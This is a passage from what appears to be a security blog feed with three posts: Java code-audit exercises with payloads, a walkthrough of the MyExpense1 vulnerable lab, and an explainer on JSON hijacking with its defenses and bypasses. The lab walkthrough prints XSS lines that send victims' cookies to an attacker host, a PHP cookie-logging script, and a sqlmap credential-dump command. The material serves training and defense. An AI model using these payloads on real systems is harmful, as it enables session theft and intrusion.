&quot;username&quot;:&quot;foo&quot;,</span><br><span class="line">  &quot;permission&quot;:&quot;all&quot;,</span><br><span class="line">  &quot;permission&quot;:&quot;none&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Day-8-Icicles之未授权下载"><a href="#Day-8-Icicles之未授权下载" class="headerlink" title="Day 8 - Icicles之未授权下载"></a>Day 8 - Icicles之未授权下载</h2><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetPath</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                       HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      String icons = request.getParameter(<span class="string">"icons"</span>);</span><br><span class="line">      String filename = request.getParameter(<span class="string">"filename"</span>);</span><br><span class="line"></span><br><span class="line">      File f_icons = <span class="keyword">new</span> File(icons);</span><br><span class="line">      File f_filename = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!icons.equals(f_icons.getName())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"File not within target directory!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!filename.equals(f_filename.getName())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"File not within target directory!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String toDir = <span class="string">"/var/myapp/data/"</span> + f_icons.getName() + <span class="string">"/"</span>;</span><br><span class="line">      File file = <span class="keyword">new</span> File(toDir, filename);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      response.sendRedirect(<span class="string">"/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码大致逻辑为通过参数<code>icons</code>和<code>filename</code>获取文件路径与文件名，通过<code>File</code>类的<code>getName</code>函数来获取当前路径或文件的名字，有效防止目录遍历的危险，如<code>../../pass.txt</code>获取的结果为<code>pass.txt</code>，但当<code>..pass.txt</code>时仍为<code>..pass.txt</code>，因此payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icons=..&amp;filename=hacked.txt</span><br></pre></td></tr></table></figure><h2 id="Day-9-Chestnuts之ReDos"><a href="#Day-9-Chestnuts之ReDos" class="headerlink" title="Day 9 - Chestnuts之ReDos"></a>Day 9 - Chestnuts之ReDos</h2><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Validator</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    response.setContentType(<span class="string">"text/plain"</span>);</span><br><span class="line">    response.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line"></span><br><span class="line">    PrintWriter out = response.getWriter();</span><br><span class="line">    <span class="keyword">if</span> (isInWhiteList(request.getParameter(<span class="string">"whitelist"</span>), request.getParameter(<span class="string">"value"</span>))) &#123;</span><br><span class="line">      out.print(<span class="string">"Value is in whitelist."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      out.print(<span class="string">"Value is not in whitelist."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    out.flush();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isInWhiteList</span><span class="params">(String whitelist, String value)</span> </span>&#123;</span><br><span class="line">    Pattern pattern = Pattern.compile(<span class="string">"^["</span> + whitelist + <span class="string">"]+"</span>);</span><br><span class="line">    Matcher matcher = pattern.matcher(value);</span><br><span class="line">    <span class="keyword">return</span> matcher.matches();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中的<code>whitelist</code>参数是正则表达式模式的部分。value参数值在第22行被验证是否符合<code>whitelist</code>组成的模式。由于<code>whitelist</code>和<code>value</code>的值都是由攻击者控制的，攻击者可以注入任意正则表达式并控制该表达式的值与之相配。使用复杂的正则表达式产生CPU消耗，从而导致DoS。这种DoS的方式被称为ReDoS。</p><p>将连接<code>whitelist</code>作为<code>pattern</code>的”[“和”]”分别改为”(“和”)”。在前面的测试中，发现”[“和”]”，并不能导致拒绝服务攻击。将其改成”(“和”)”即可导致拒绝服务。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whitelist=([a-z])+.)+[A-Z]([a-z]&amp;value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><h2 id="Day-10-Anticipation之XML响应中的XSS"><a href="#Day-10-Anticipation之XML响应中的XSS" class="headerlink" title="Day 10 - Anticipation之XML响应中的XSS"></a>Day 10 - Anticipation之XML响应中的XSS</h2><p>漏洞代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/webdav"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">webdav</span><span class="params">(HttpServletResponse res, @RequestParam(<span class="string">"name"</span>)</span> String name) <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    res.setContentType(<span class="string">"text/xml"</span>);</span><br><span class="line">    res.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">    PrintWriter pw = res.getWriter();</span><br><span class="line">    name = name.replace(<span class="string">"]]"</span>, <span class="string">""</span>);</span><br><span class="line">    pw.print(<span class="string">"&lt;person&gt;"</span>);</span><br><span class="line">    pw.print(<span class="string">"&lt;name&gt;&lt;![CDATA["</span> + name.replace(<span class="string">" "</span>,<span class="string">""</span>) + <span class="string">"]]&gt;&lt;/name&gt;"</span>);</span><br><span class="line">    pw.print(<span class="string">"&lt;/person&gt;"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这段代码中，用户输入通过@RequestParam注解从GET或POST参数”name”到达函数中的name参数。且第三行响应的”Content-Type”被设置为”text/xml”。输入流是攻击者可控的，则他可以注入具有xml名称空间属性”<a href="http://www.w3.org/1999/xhtml" target="_blank" rel="noopener">http://www.w3.org/1999/xhtml”的script标签，从而执行XSS。</a></p><p>CDATA指的是不应由XML解析器进行解析的文本数据，因此需要将其闭合以避免注入的JS代码变成文本。然后注入带有命名空间属性<strong>“<a href="http://www.w3.org/1999/xhtml&quot;" target="_blank" rel="noopener">http://www.w3.org/1999/xhtml&quot;</a></strong>的script标签，将script标签定义为具有html属性的script标签。因此可以被浏览器当作JavaScript代码执行。payload如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=test] ]&gt;&lt;something%3Ascript%09xmlns%3Asomething%3D&quot;http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml&quot;&gt;alert(1)&lt;%2Fsomething%3Ascript&gt;&lt;![CDATA[</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通过一些典型的Java代码来分析易产生漏洞的点，入门篇。。。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://www.sys71m.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java" scheme="https://www.sys71m.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>MyExpense1靶机题解</title>
    <link href="https://www.sys71m.top/2019/12/29/%E9%9D%B6%E6%9C%BAMyExpense1%E9%A2%98%E8%A7%A3/"/>
    <id>https://www.sys71m.top/2019/12/29/%E9%9D%B6%E6%9C%BAMyExpense1%E9%A2%98%E8%A7%A3/</id>
    <published>2019-12-29T09:28:33.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>MyExpense1靶机题解，感觉不错，贴近真实情况，这里记录一下</p><a id="more"></a>  <p>靶机地址：<a href="https://www.vulnhub.com/entry/myexpense-1,405/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/myexpense-1,405/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MyExpense is a deliberately vulnerable web application that allows you to train in detecting and exploiting different web vulnerabilities. Unlike a more traditional &quot;challenge&quot; application (which allows you to train on a single specific vulnerability), MyExpense contains a set of vulnerabilities you need to exploit to achieve the whole scenario.</span><br></pre></td></tr></table></figure><h2 id="扫描的艺术"><a href="#扫描的艺术" class="headerlink" title="扫描的艺术"></a>扫描的艺术</h2><p>用vbox导入，直接打开就行，首先探测一下靶机的地址。</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577611164368.png" alt="1577611164368"></p><p>然后扫描一下端口，看看有啥开放的服务</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577611402240.png" alt="1577611402240"></p><p>发现不止是80端口有http服务，还有其他端口，先看下主要端口，正常的web界面，有登录和注册功能，后台语言用的是php，闲来无事先扫一波目录。</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577611870730.png" alt="1577611870730"></p><p>发现<code>admin/admin.php</code>路径，并且直接可以进行访问，看来没有进行访问控制，发现了所有注册的用户以及邮箱等信息，先尝试用题目作者给出的账户密码登一下测试<code>samuel/fzghn4lw</code>，发现被限制了登录，注册的新用户（需要前端绕过，将disabled去掉即可）没有的到管理员的授权也无法登录，，然后尝试对所有用户进行弱口令爆破，无果。。。</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577612348068.png" alt="1577612348068"></p><h2 id="XSS的艺术"><a href="#XSS的艺术" class="headerlink" title="XSS的艺术"></a>XSS的艺术</h2><p>到这发现似乎没啥进展了，值得注意的是在注册处所输入的信息是会存到后台并且管理员是会看到的，似乎又有了一种新的思路，可以在注册处构造xss在管理员访问时把cookie弹到自己的服务器上。构造的xss如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">'&lt;img src="http://192.168.56.102:4444?cookie='</span>+<span class="built_in">document</span>.cookie+<span class="string">'"/&gt;'</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>将cookie插入到<code>Firstname</code>出并在本地监听4444端口，成功接收到管理员的cookie</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577614548196.png" alt="1577614548196"></p><p>尝试用管理员的cookie登录，然而显示只能一次进行身份验证，看来无法作为管理员进行操作了，现在尝试从另一个角度尝试，可以构造xss使管理员自己进行操作，也减少了异地ip登录被发现的风险，一举两个0.0</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577614722174.png" alt="1577614722174"></p><p>构造的xss如下，并成功更改了账户状态，登录后提交申请的报销表单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">'&lt;img src="http://192.168.56.101/admin/admin.php?id=11&amp;status=active"/&gt;'</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577615158076.png" alt="1577615158076"></p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577615384935.png" alt="1577615384935"></p><p>以为到这就可以了，然而事情没有这么简单，不光要提交，还需要有人同意才可以，再次看一下用户的信息，发现<code>Samuel</code>的上级管理：</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577619457809.png" alt="1577619457809"></p><p>在用户主页出发现了<code>slamotte</code>与<code>manon Riviere</code>的对话信息，提交message，尝试xss看是可以返回manage的cookie.</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577619630595.png" alt="1577619630595"></p><p>本地启动<code>apache2</code>，sh.php如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">file_put_contents(<span class="string">"res.txt"</span>,$a.<span class="string">"      "</span>.date(<span class="string">'H:i:s'</span>).<span class="string">"\n"</span>,FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>xss构造如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">'&lt;img src="http://192.168.56.102/sh.php?cookie='</span>+<span class="built_in">document</span>.cookie+<span class="string">'" width=0 height=0 border=0 /&gt;'</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577620570476.png" alt="1577620570476"></p><p>发现接受到了好多的cookie，逐个尝试一下，最后成功以manager的身份登陆了，然后同意下级用户的请求。</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577626480456.png" alt="1577626480456"></p><p>查看manage的信息，发现mriviere也存在上级manager为<code>baudouin</code></p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577628046522.png" alt="1577628046522"></p><h2 id="注入的艺术"><a href="#注入的艺术" class="headerlink" title="注入的艺术"></a>注入的艺术</h2><p>在<code>Manon Riviere</code>的界面处url发现了带有id参数的请求，第一反应是存在注入，因为页面需要带有cookie才可以访问，所以先用Burp截获一下请求，让后使用sqlmap进行自动化注入。</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577681768049.png" alt></p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577681817998.png" alt></p><p>接下来就是常规的跑表，字段，以及内容就可以了，最终命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test.txt -D myexpense -T user -C username,password --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577682450046.png" alt></p><p>密码为md5加密，在somd5上尝试解密一下：</p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577682549257.png" alt></p><p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/myexpense/1577682726630.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;MyExpense1靶机题解，感觉不错，贴近真实情况，这里记录一下&lt;/p&gt;
    
    </summary>
    
    
      <category term="靶机" scheme="https://www.sys71m.top/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="靶机" scheme="https://www.sys71m.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>JSON劫持攻击</title>
    <link href="https://www.sys71m.top/2019/11/10/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/"/>
    <id>https://www.sys71m.top/2019/11/10/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/</id>
    <published>2019-11-10T07:35:11.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>此类攻击属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站通过 JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。</p><a id="more"></a>  <h2 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h2><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>通俗来说是为了防止网站之间互相进行数据访问一种策略，如<code>www.hack.com</code>可轻松读取<code>www.bank.com</code>中的cookie，利用cookie攻击者可轻松完成登录，进行转账等操作，后果可想而知，因此诞生了同源策略。如果两个页面的协议，端口（如果有指定）和主机都相同，则两个页面具有相同的源。</p><p>注意：调用js文件不受同源的影响，并且src属性引入的文件都不受同源的限制，json数据是被js原生支持的。</p><h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><p>是一种轻量级的数据交换格式</p><h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3><p>全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 <code>&lt;script&gt;&lt;/script&gt;</code>元素标签，远程调用 JSON 文件来实现数据传递。</p><h3 id="json劫持"><a href="#json劫持" class="headerlink" title="json劫持"></a>json劫持</h3><p>属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击的一种类型，攻击者构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的，下面会进行举例。</p><h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>假设网站有获取用户名和密码的功能。</p><p>前端index.php代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">    alert(<span class="string">"name:"</span>+data.name+<span class="string">"\npass:"</span>+data.pass);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://www.test.com/api.php?callback=show&amp;name=admin"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后端接口api.php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line">$data1=<span class="keyword">array</span>(<span class="string">"name"</span>=&gt;<span class="string">"admin"</span>,<span class="string">"pass"</span>=&gt;<span class="string">"admin"</span>);</span><br><span class="line">$data2=<span class="keyword">array</span>(<span class="string">"name"</span>=&gt;<span class="string">"test"</span>,<span class="string">"pass"</span>=&gt;<span class="string">"test"</span>);</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>]===<span class="string">'admin'</span>) &#123;</span><br><span class="line">    $data=$data1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>]===<span class="string">'test'</span>) &#123;</span><br><span class="line">    $data=$data2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>($callback.<span class="string">"("</span>.json_encode($data).<span class="string">")"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>显示结果如下：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/json/image-20200229145732284.png" alt="image-20200229145732284"></p><p>可以看到，后台通过接收到的<code>callback</code>可动态调用前端js代码。假设作为一个攻击者，当攻击者在登录网站的情况下，我们可以自定义js函数，改变<code>callback</code>的值，使其调用我们自定义的js代码，假设存在网站<code>www.hack.com</code>，诱导受害者访问该网站。</p><p><code>www.hack.com</code>中<code>index.php</code>如下，为了便于查看，还是以弹窗的形式展示数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">send_data</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">    alert(<span class="string">"name:"</span>+data.name+<span class="string">"\npass:"</span>+data.pass);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://www.test.com/api.php?callback=send_data&amp;name=admin"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结果如下，可以看到敏感数据已经被<code>hack.com</code>获取：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/json/image-20200229145904336.png" alt="image-20200229145904336"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="限制referer，同源检测"><a href="#限制referer，同源检测" class="headerlink" title="限制referer，同源检测"></a>限制referer，同源检测</h3><p>当服务器端收到调用的请求时，判断是否为该网站发起的请求，进而做下一步判断，修改<code>api.php</code>如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_REFERER'</span>]!==<span class="string">'http://www.test.com'</span>) &#123;</span><br><span class="line">$error=<span class="keyword">array</span>(<span class="string">"name"</span>=&gt;<span class="string">"error"</span>,<span class="string">"pass"</span>=&gt;<span class="string">"error"</span>);</span><br><span class="line">    <span class="keyword">exit</span>($callback.<span class="string">"("</span>.json_encode($error).<span class="string">")"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$data1=<span class="keyword">array</span>(<span class="string">"name"</span>=&gt;<span class="string">"admin"</span>,<span class="string">"pass"</span>=&gt;<span class="string">"admin"</span>);</span><br><span class="line">$data2=<span class="keyword">array</span>(<span class="string">"name"</span>=&gt;<span class="string">"test"</span>,<span class="string">"pass"</span>=&gt;<span class="string">"test"</span>);</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>]===<span class="string">'admin'</span>) &#123;</span><br><span class="line">    $data=$data1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>]===<span class="string">'test'</span>) &#123;</span><br><span class="line">    $data=$data2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>($callback.<span class="string">"("</span>.json_encode($data).<span class="string">")"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时，再次访问<code>hack.com</code>得到如下结果：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/json/image-20200229145957134.png" alt="image-20200229145957134"></p><h3 id="Samesite-Cookie"><a href="#Samesite-Cookie" class="headerlink" title="Samesite Cookie"></a>Samesite Cookie</h3><p>这是Chrome 51 开始，浏览器的 Cookie 新增加了一个<code>SameSite</code>属性，用来防止 CSRF 攻击和用户追踪。它可以设置三个值。</p><p>Strict：最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。</p><p>Lax：规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。</p><p>None：显式关闭<code>SameSite</code>属性，将其设为<code>None</code>。不过，前提是必须同时设置<code>Secure</code>属性（Cookie 只能通过 HTTPS 协议发送），否则无效。</p><h3 id="使用token"><a href="#使用token" class="headerlink" title="使用token"></a>使用token</h3><p>在服务器端可以给用户生成一个随机的token，设置到攻击页面无法读取的地方，每次请求时带有token，，并验证token的准确性。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="data-URI-绕过-referer"><a href="#data-URI-绕过-referer" class="headerlink" title="data URI 绕过 referer"></a>data URI 绕过 referer</h3><p>data URI不会发送referer头 data还可以使用base64编码</p><h3 id="https转到http-referer"><a href="#https转到http-referer" class="headerlink" title="https转到http referer"></a>https转到http referer</h3><p>https转到http会返回一个空的referer (为了防止数据泄露)</p><h3 id="绕过token"><a href="#绕过token" class="headerlink" title="绕过token"></a>绕过token</h3><p>具体案例</p><p><a href="http://www.91ri.org/13407.html" target="_blank" rel="noopener">http://www.91ri.org/13407.html</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 